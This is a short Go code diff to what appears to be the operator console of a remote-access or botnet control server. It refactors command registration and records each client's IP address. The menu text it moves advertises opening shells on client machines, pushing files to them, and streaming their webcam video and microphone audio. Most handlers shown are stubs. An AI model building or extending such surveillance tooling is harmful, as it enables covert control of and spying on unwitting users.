@@ -50,59 +50,7 @@ func main() {
     \_\/   \________\/ \___/_(   \_____\/
 `)
 
-	shell.AddCmd(&ishell.Cmd{
-		Name: "ping",
-		Help: "Sends ping",
-		Func: cmdPing,
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "set_filter",
-		Help: "Sets global filters for subsequent commands (ex. os=mac).",
-		Func: cmdDefault,
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "list",
-		Help: "List active clients.",
-		Func: cmdList,
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "client_list_sync",
-		Help: "Ping each client and sync the local list with updated data.",
-		Func: cmdDefault,
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "shell",
-		Help: "Opens shell on a specific client.",
-		Func: cmdDefault,
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "upload",
-		Help: "Uploads the given file path to the ipfs client network.",
-		Func: cmdDefault,
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "file_list",
-		Help: "List files in client ipfs network.",
-		Func: cmdDefault,
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "monitor",
-		Help: "Open a video grid from clients that match the filter.",
-		Func: cmdDefault,
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "listen",
-		Help: "Open an audio stream from a client microphone.",
-		Func: cmdDefault,
-	})
+	InitCommands(shell)
 
 	shell.Run()
 }
@@ -140,6 +88,7 @@ func acceptClient(w http.ResponseWriter, r *http.Request) {
 		client.Connection.IsActive = true
 	}
 
+	client.ExternalIP = r.RemoteAddr
 	client.Connection.ParentID = client.ID
 	client.Connection.readCallback = func(conn *Conn, message string) {
 		//client.Connection.send <- []byte("Active")
